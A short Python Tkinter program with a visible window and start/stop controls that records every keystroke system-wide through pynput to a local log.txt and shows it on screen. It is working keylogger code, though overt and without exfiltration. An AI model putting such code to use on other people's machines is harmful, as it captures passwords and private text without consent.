import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from pynput.keyboard import Listener

logging = False
listener = None

def writetofile(key):
    global output_text
    keydata = str(key).replace("'", "")

    if keydata == 'Key.space':
        keydata = ' '
    elif keydata == 'Key.shift_r' or keydata == 'Key.ctrl_l':
        keydata = ''
    elif keydata == 'Key.enter':
        keydata = '\n'
    elif keydata == 'Key.backspace':
        keydata = ''

    # Write to log file
    with open("log.txt", 'a') as f:
        f.write(keydata)
    
    # Display in GUI
    output_text.insert(tk.END, keydata)
    output_text.see(tk.END)  # Automatically scroll to the bottom

def start_logging():
    global logging, listener
    if not logging:
        logging = True
        listener = Listener(on_press=writetofile)
        listener.start()
        status_label.config(text="Status: Logging")

def stop_logging():
    global logging, listener
    if logging and listener:
        logging = False
        listener.stop()
        listener = None
        status_label.config(text="Status: Stopped")

def clear_log():
    global output_text
    # Clear log file
    with open("log.txt", 'w') as f:
        f.write("")
    # Clear the GUI display
    output_text.delete(1.0, tk.END)

# Initialize the main GUI window
root = tk.Tk()
root.title("Key Logger")
root.geometry("500x400")

# Add status label
status_label = tk.Label(root, text="Status: Stopped", font=("Arial", 12))
status_label.pack(pady=10)

# Add start button
start_button = tk.Button(root, text="Start Logging", font=("Arial", 12), command=start_logging)
start_button.pack(pady=10)

# Add stop button
stop_button = tk.Button(root, text="Stop Logging", font=("Arial", 12), command=stop_logging)
stop_button.pack(pady=10)

# Add clear button
clear_button = tk.Button(root, text="Clear Log", font=("Arial", 12), command=clear_log)
clear_button.pack(pady=10)

# Add text box to display output
output_text = ScrolledText(root, wrap=tk.WORD, font=("Arial", 10), height=15)
output_text.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

# Add exit button
exit_button = tk.Button(root, text="Exit", font=("Arial", 12), command=root.quit)
exit_button.pack(pady=10)

# Run the Tkinter main loop
root.mainloop()
